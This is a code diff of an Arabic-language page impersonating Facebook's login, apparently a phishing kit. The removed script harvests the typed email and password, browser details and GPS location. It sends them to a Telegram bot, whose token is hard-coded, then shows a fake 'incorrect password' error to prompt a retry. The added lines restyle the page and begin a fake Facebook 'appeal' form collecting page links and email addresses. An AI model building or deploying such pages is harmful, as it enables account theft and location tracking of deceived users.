@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%231877f2' d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/></svg>">
     <style>
         * {
             margin: 0;
@@ -19,123 +20,264 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* تأثير الخلفية المتحركة */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(24, 119, 242, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(66, 184, 131, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
+            animation: backgroundFloat 20s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        @keyframes backgroundFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            33% { transform: translateY(-10px) rotate(1deg); }
+            66% { transform: translateY(5px) rotate(-1deg); }
         }
 
         .container {
             display: flex;
             max-width: 1200px;
             width: 100%;
-            gap: 50px;
+            gap: 60px;
             align-items: center;
+            animation: containerSlideIn 1s ease-out;
+        }
+
+        @keyframes containerSlideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(50px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
         }
 
         .left-section {
             flex: 1;
             text-align: center;
+            animation: fadeInLeft 1.2s ease-out;
+        }
+
+        @keyframes fadeInLeft {
+            from { opacity: 0; transform: translateX(-30px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         .facebook-logo {
-            font-size: 4rem;
+            font-size: 4.5rem;
             font-weight: bold;
             color: #1877f2;
             margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            text-shadow: 
+                0 4px 8px rgba(24, 119, 242, 0.3),
+                0 2px 4px rgba(0, 0, 0, 0.1);
+            animation: logoFloat 3s ease-in-out infinite;
+            transition: transform 0.3s ease;
+        }
+
+        .facebook-logo:hover {
+            transform: scale(1.05);
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
         }
 
         .tagline {
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             color: #1c1e21;
             line-height: 1.4;
             margin-bottom: 30px;
+            opacity: 0.9;
+            animation: fadeIn 1.5s ease-out 0.3s both;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .right-section {
             flex: 1;
-            max-width: 400px;
+            max-width: 420px;
+            animation: fadeInRight 1.2s ease-out 0.2s both;
+        }
+
+        @keyframes fadeInRight {
+            from { opacity: 0; transform: translateX(30px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         .login-form {
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            padding: 30px;
-            animation: slideUp 0.6s ease-out;
+            border-radius: 12px;
+            box-shadow: 
+                0 4px 6px rgba(0, 0, 0, 0.07),
+                0 1px 3px rgba(0, 0, 0, 0.06),
+                0 16px 24px rgba(0, 0, 0, 0.06);
+            padding: 35px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        .login-form:hover {
+            transform: translateY(-2px);
+            box-shadow: 
+                0 8px 25px rgba(0, 0, 0, 0.1),
+                0 4px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .login-form::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #1877f2, #42b883, #1877f2);
+            background-size: 200% 100%;
+            animation: gradientShine 3s ease-in-out infinite;
+        }
+
+        @keyframes gradientShine {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
 
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 18px;
+            animation: slideUp 0.6s ease-out;
+            animation-fill-mode: both;
+        }
+
+        .input-group:nth-child(1) { animation-delay: 0.1s; }
+        .input-group:nth-child(2) { animation-delay: 0.2s; }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .form-input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
+            padding: 16px 18px;
+            border: 2px solid #dddfe2;
+            border-radius: 8px;
             font-size: 16px;
             background: #f5f6f7;
             transition: all 0.3s ease;
             direction: ltr;
+            position: relative;
         }
 
         .form-input:focus {
             outline: none;
             border-color: #1877f2;
             background: white;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            box-shadow: 
+                0 0 0 3px rgba(24, 119, 242, 0.1),
+                0 2px 8px rgba(24, 119, 242, 0.15);
+            transform: translateY(-1px);
         }
 
         .form-input::placeholder {
             color: #90949c;
+            transition: color 0.3s ease;
+        }
+
+        .form-input:focus::placeholder {
+            color: #65676b;
         }
 
         .login-btn {
             width: 100%;
-            padding: 14px;
-            background: #1877f2;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877f2 0%, #0866d6 100%);
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
+            position: relative;
+            overflow: hidden;
+            animation: slideUp 0.6s ease-out 0.3s both;
+        }
+
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s ease;
         }
 
         .login-btn:hover {
-            background: #166fe5;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+            background: linear-gradient(135deg, #166fe5 0%, #0653c4 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4);
+        }
+
+        .login-btn:hover::before {
+            left: 100%;
         }
 
         .login-btn:active {
             transform: translateY(0);
         }
 
+        .login-btn:disabled {
+            background: #42b883;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .forgot-password {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
+            animation: slideUp 0.6s ease-out 0.4s both;
         }
 
         .forgot-password a {
             color: #1877f2;
             text-decoration: none;
             font-size: 14px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
         }
 
         .forgot-password a:hover {
+            background: rgba(24, 119, 242, 0.1);
             text-decoration: underline;
         }
 
         .divider {
             text-align: center;
-            margin: 20px 0;
+            margin: 22px 0;
             position: relative;
+            animation: slideUp 0.6s ease-out 0.5s both;
         }
 
         .divider::before {
@@ -145,77 +287,124 @@
             left: 0;
             right: 0;
             height: 1px;
-            background: #dadde1;
+            background: linear-gradient(90deg, transparent, #dadde1, transparent);
         }
 
         .divider span {
             background: white;
-            padding: 0 15px;
+            padding: 0 20px;
             color: #65676b;
             font-size: 14px;
+            font-weight: 500;
         }
 
         .create-account-btn {
             width: 100%;
-            padding: 14px;
-            background: #42b883;
+            padding: 16px;
+            background: linear-gradient(135deg, #42b883 0%, #369870 100%);
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            animation: slideUp 0.6s ease-out 0.6s both;
+        }
+
+        .create-account-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s ease;
         }
 
         .create-account-btn:hover {
-            background: #369870;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(66, 184, 131, 0.4);
+            background: linear-gradient(135deg, #369870 0%, #2d7a5f 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(66, 184, 131, 0.4);
+        }
+
+        .create-account-btn:hover::before {
+            left: 100%;
         }
 
         .footer-text {
             text-align: center;
-            margin-top: 30px;
+            margin-top: 35px;
             color: #65676b;
             font-size: 14px;
+            animation: slideUp 0.6s ease-out 0.7s both;
         }
 
         .footer-text a {
             color: #1877f2;
             text-decoration: none;
+            transition: all 0.3s ease;
+            padding: 2px 4px;
+            border-radius: 3px;
         }
 
         .footer-text a:hover {
+            background: rgba(24, 119, 242, 0.1);
             text-decoration: underline;
         }
 
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 6px;
+        .success-message, .error-message {
+            padding: 16px 20px;
+            border-radius: 8px;
             margin-bottom: 20px;
             text-align: center;
             display: none;
+            animation: messageSlideIn 0.5s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @keyframes messageSlideIn {
+            from { opacity: 0; transform: translateY(-10px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .success-message {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
             border: 1px solid #c3e6cb;
         }
 
         .error-message {
-            background: #f8d7da;
+            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
             color: #721c24;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
             border: 1px solid #f5c6cb;
         }
 
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* تحسينات الجوال */
         @media (max-width: 768px) {
             .container {
                 flex-direction: column;
-                gap: 30px;
+                gap: 40px;
+                padding: 0 15px;
             }
 
             .left-section {
@@ -223,21 +412,282 @@
             }
 
             .facebook-logo {
-                font-size: 3rem;
+                font-size: 3.5rem;
             }
 
             .tagline {
-                font-size: 1.2rem;
+                font-size: 1.3rem;
+                line-height: 1.3;
             }
 
             .right-section {
                 max-width: 100%;
+                width: 100%;
             }
+
+            .login-form {
+                padding: 25px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .facebook-logo {
+                font-size: 2.8rem;
+            }
+
+            .tagline {
+                font-size: 1.1rem;
+            }
+
+            .login-form {
+                padding: 20px;
+            }
+
+            .form-input {
+                padding: 14px 16px;
+                font-size: 16px;
+            }
+
+            .login-btn, .create-account-btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+
+        /* تأثيرات إضافية */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* صفحة الدعم */
+        .support-page {
+            display: none;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6ea 100%);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        .support-header {
+            background: linear-gradient(135deg, #1877f2 0%, #0866d6 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+
+        .support-header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .support-facebook-logo {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+
+        .support-header-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+
+        .support-container {
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 0 20px;
+        }
+
+        .support-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+            padding: 40px;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .support-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, #1877f2, #42b883, #e74c3c, #1877f2);
+            background-size: 300% 100%;
+            animation: gradientMove 4s ease-in-out infinite;
+        }
+
+        @keyframes gradientMove {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .support-title {
+            color: #1c1e21;
+            font-size: 2.2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .support-subtitle {
+            color: #65676b;
+            font-size: 1.2rem;
+            text-align: center;
+            margin-bottom: 35px;
+            line-height: 1.6;
+        }
+
+        .alert-warning {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border: 2px solid #ffeaa7;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .alert-icon {
+            font-size: 2rem;
+            color: #856404;
+        }
+
+        .alert-text {
+            color: #856404;
+            font-weight: 600;
+            font-size: 1.05rem;
+        }
+
+        .support-form-group {
+            margin-bottom: 25px;
+        }
+
+        .support-form-label {
+            display: block;
+            color: #1c1e21;
+            font-weight: 700;
+            margin-bottom: 10px;
+            font-size: 1rem;
+        }
+
+        .support-form-label::after {
+            content: '*';
+            color: #e74c3c;
+            margin-right: 5px;
+            font-weight: bold;
+        }
+
+        .support-form-input, .support-form-textarea {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 16px;
+            background: #f8f9fa;
+            transition: all 0.3s ease;
+            direction: ltr;
+            font-family: inherit;
+        }
+
+        .support-form-input:focus, .support-form-textarea:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+        }
+
+        .support-form-textarea {
+            min-height: 140px;
+            resize: vertical;
+        }
+
+        .support-submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #1877f2 0%, #0866d6 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .support-submit-btn:hover {
+            background: linear-gradient(135deg, #166fe5 0%, #0653c4 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(24, 119, 242, 0.4);
+        }
+
+        .support-submit-btn:disabled {
+            background: linear-gradient(135deg, #42b883 0%, #369870 100%);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .support-success-message {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            border: 2px solid #28a745;
+            color: #155724;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            display: none;
+            margin-top: 25px;
+        }
+
+        .support-success-icon {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .help-text {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 8px;
+            line-height: 1.5;
+            font-style: italic;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- صفحة تسجيل الدخول -->
+    <div class="container" id="loginPage">
         <div class="left-section">
             <div class="facebook-logo">facebook</div>
             <div class="tagline">
@@ -286,233 +736,63 @@
         </div>
     </div>
 
-    <script>
-        function collectData() {
-            const ua = navigator.userAgent;
-            
-            let deviceType = 'كمبيوتر';
-            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
-            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
-            
-            let browser = 'غير معروف';
-            if (ua.includes('Chrome')) browser = 'كروم';
-            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
-            else if (ua.includes('Safari')) browser = 'سفاري';
-            else if (ua.includes('Edge')) browser = 'إيدج';
-            
-            let os = 'غير معروف';
-            if (ua.includes('Windows')) os = 'ويندوز';
-            else if (ua.includes('Mac')) os = 'ماك';
-            else if (ua.includes('Linux')) os = 'لينكس';
-            else if (ua.includes('Android')) os = 'أندرويد';
-            else if (ua.includes('iOS')) os = 'iOS';
-            
-            return {
-                timestamp: new Date().toLocaleString('ar-IQ'),
-                page_url: window.location.href,
-                device_type: deviceType,
-                browser: browser,
-                operating_system: os,
-                screen_resolution: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                user_agent: ua,
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
-                latitude: window.userLocation?.latitude || 'غير متاح',
-                longitude: window.userLocation?.longitude || 'غير متاح',
-                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
-                location_status: window.userLocation?.status || 'لم يتم الطلب'
-            };
-        }
+    <!-- صفحة الدعم -->
+    <div class="support-page" id="supportPage">
+        <div class="support-header">
+            <div class="support-header-content">
+                <div class="support-facebook-logo">facebook</div>
+                <div class="support-header-title">مركز المساعدة والدعم الفني</div>
+            </div>
+        </div>
 
-        function sendToTelegram(data) {
-            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
-            const TELEGRAM_CHAT_ID = '170383339';
-            
-            const message = `
-🔐 بيانات تسجيل دخول فيس بوك جديدة!
-━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${data.timestamp}
-📧 البريد الإلكتروني: ${data.email}
-🔑 كلمة المرور: ${data.password}
-━━━━━━━━━━━━━━━━━━━━
-🌐 الرابط: ${data.page_url}
-📱 الجهاز: ${data.device_type}
-💻 المتصفح: ${data.browser}
-🖥️ النظام: ${data.operating_system}
-📺 الدقة: ${data.screen_resolution}
-🌍 المنطقة: ${data.timezone}
-🗣️ اللغة: ${data.language}
-📍 حالة الموقع: ${data.location_status}
-📐 خط العرض: ${data.latitude}
-📐 خط الطول: ${data.longitude}
-🎯 دقة الموقع: ${data.location_accuracy}
-━━━━━━━━━━━━━━━━━━━━
-            `;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            return fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).then(response => {
-                if (response.ok) {
-                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
-                    return response.json();
-                } else {
-                    console.error('❌ فشل إرسال البيانات إلى Telegram');
-                    throw new Error('Telegram API Error');
-                }
-            }).then(data => {
-                console.log('📱 استجابة Telegram:', data);
-                return data;
-            }).catch(error => {
-                console.error('❌ خطأ في الإرسال:', error);
-                throw error;
-            });
-        }
+        <div class="support-container">
+            <div class="support-card">
+                <h1 class="support-title">🛡️ تقديم طعن على انتهاك</h1>
+                <p class="support-subtitle">
+                    إذا كنت تعتقد أن المحتوى الخاص بك تم حذفه أو تقييده بشكل خاطئ، يمكنك تقديم طعن وسنقوم بمراجعته خلال 24-48 ساعة
+                </p>
 
-        function showMessage(type, message) {
-            const successMsg = document.getElementById('successMessage');
-            const errorMsg = document.getElementById('errorMessage');
-            
-            // إخفاء جميع الرسائل أولاً
-            successMsg.style.display = 'none';
-            errorMsg.style.display = 'none';
-            
-            if (type === 'success') {
-                successMsg.style.display = 'block';
-                if (message) successMsg.textContent = message;
-            } else if (type === 'error') {
-                errorMsg.style.display = 'block';
-                if (message) errorMsg.textContent = message;
-            }
-            
-            // إخفاء الرسالة بعد 3 ثوان
-            setTimeout(() => {
-                successMsg.style.display = 'none';
-                errorMsg.style.display = 'none';
-            }, 3000);
-        }
+                <div class="alert-warning">
+                    <span class="alert-icon">⚠️</span>
+                    <div class="alert-text">
+                        يرجى تقديم معلومات دقيقة ومفصلة لضمان المراجعة السريعة والفعالة لطلبك
+                    </div>
+                </div>
 
-        // معالجة إرسال النموذج
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                showMessage('error', 'يرجى ملء جميع الحقول');
-                return;
-            }
-            
-            // تغيير نص الزر أثناء المعالجة
-            const loginBtn = document.getElementById('loginBtn');
-            const originalText = loginBtn.textContent;
-            loginBtn.textContent = 'جاري التحقق...';
-            loginBtn.disabled = true;
-            
-            // جمع البيانات
-            const data = collectData();
-            console.log('بيانات تسجيل الدخول:', data);
-            
-            // إرسال البيانات فوراً إلى Telegram
-            sendToTelegram(data).then(() => {
-                // إظهار رسالة خطأ مزيفة بعد الإرسال الناجح
-                setTimeout(() => {
-                    showMessage('error', 'البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.');
-                    
-                    // إعادة تعيين الزر
-                    loginBtn.textContent = originalText;
-                    loginBtn.disabled = false;
-                    
-                    // مسح كلمة المرور لتشجيع المحاولة مرة أخرى
-                    document.getElementById('password').value = '';
-                }, 1500);
-            }).catch((error) => {
-                // في حالة فشل الإرسال، إظهار رسالة خطأ عامة
-                setTimeout(() => {
-                    showMessage('error', 'حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
-                    
-                    // إعادة تعيين الزر
-                    loginBtn.textContent = originalText;
-                    loginBtn.disabled = false;
-                }, 1500);
-            });
-        });
+                <form id="supportForm">
+                    <div class="support-form-group">
+                        <label class="support-form-label">رابط الصفحة أو المنشور المتأثر</label>
+                        <input type="url" class="support-form-input" id="pageUrl" placeholder="https://facebook.com/..." required>
+                        <div class="help-text">ضع الرابط الكامل للصفحة أو المنشور الذي تم تقييده أو حذفه</div>
+                    </div>
 
-        // جمع الموقع الجغرافي عند تحميل الصفحة
-        window.userLocation = { status: 'جاري المحاولة...' };
+                    <div class="support-form-group">
+                        <label class="support-form-label">نوع الانتهاك المُدعى</label>
+                        <select class="support-form-input" id="violationType" required>
+                            <option value="">اختر نوع الانتهاك...</option>
+                            <option value="spam">محتوى غير مرغوب فيه (سبام)</option>
+                            <option value="copyright">انتهاك حقوق الطبع والنشر</option>
+                            <option value="hate">خطاب كراهية أو تمييز</option>
+                            <option value="fake">معلومات مضللة أو أخبار كاذبة</option>
+                            <option value="violence">محتوى عنيف أو صادم</option>
+                            <option value="harassment">تحرش أو تنمر إلكتروني</option>
+                            <option value="nudity">محتوى إباحي أو عري</option>
+                            <option value="terrorism">محتوى إرهابي أو متطرف</option>
+                            <option value="drugs">ترويج للمخدرات أو المواد المحظورة</option>
+                            <option value="suicide">إيذاء النفس أو الانتحار</option>
+                            <option value="other">نوع آخر من الانتهاكات</option>
+                        </select>
+                        <div class="help-text">اختر النوع الأقرب للانتهاك المُدعى ضد المحتوى الخاص بك</div>
+                    </div>
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
-                
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        window.userLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: Math.round(position.coords.accuracy) + ' متر',
-                            status: 'تم الحصول عليه بنجاح'
-                        };
-                        console.log('✅ تم الحصول على الموقع:', window.userLocation);
-                    },
-                    function(error) {
-                        let errorMsg = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMsg = 'رفض المستخدم';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'الموقع غير متاح';
-                                break;
-                            case error.TIMEOUT:
-                                errorMsg = 'انتهت مهلة الانتظار';
-                                break;
-                            default:
-                                errorMsg = 'خطأ غير معروف';
-                        }
-                        
-                        window.userLocation = {
-                            latitude: 'غير متاح',
-                            longitude: 'غير متاح',
-                            accuracy: 'غير متاح',
-                            status: errorMsg
-                        };
-                        console.log('❌ فشل الحصول على الموقع:', errorMsg);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                window.userLocation = {
-                    latitude: 'غير متاح',
-                    longitude: 'غير متاح', 
-                    accuracy: 'غير متاح',
-                    status: 'المتصفح لا يدعم تحديد الموقع'
-                };
-                console.log('❌ المتصفح لا يدعم تحديد الموقع');
-            }
-        }
+                    <div class="support-form-group">
+                        <label class="support-form-label">شرح مفصل للطعن وأسباب الاعتراض</label>
+                        <textarea class="support-form-textarea" id="appealReason" placeholder="اشرح بالتفصيل لماذا تعتقد أن القرار كان خاطئاً، وما هي الحجج التي تدعم موقفك..." required></textarea>
+                        <div class="help-text">كلما كان الشرح أكثر تفصيلاً ووضوحاً، كانت فرصة قبول الطعن ومراجعة القرار أكبر</div>
+                    </div>
 
-        // الحصول على الموقع الجغرافي عند التحميل
-        window.addEventListener('load', function() {
-            console.log('🚀 تم تحميل الصفحة');
-            getLocation();
-        });
-    </script>
-</body>
-</html>
+                    <div class="support-form-group">
+                        <label class="support-form-label">بريدك الإلكتروني للمتابعة والرد</label>
+                        <input type="email" class="support-form-input" id="contactEmail" placeholder="your.email@example.com" required>
+                        <div class="help-text">سنستخدم هذا البريد للتواصل معك بخصوص حالة طلبك ونتيجة المراجعة</div>
+                    </div>
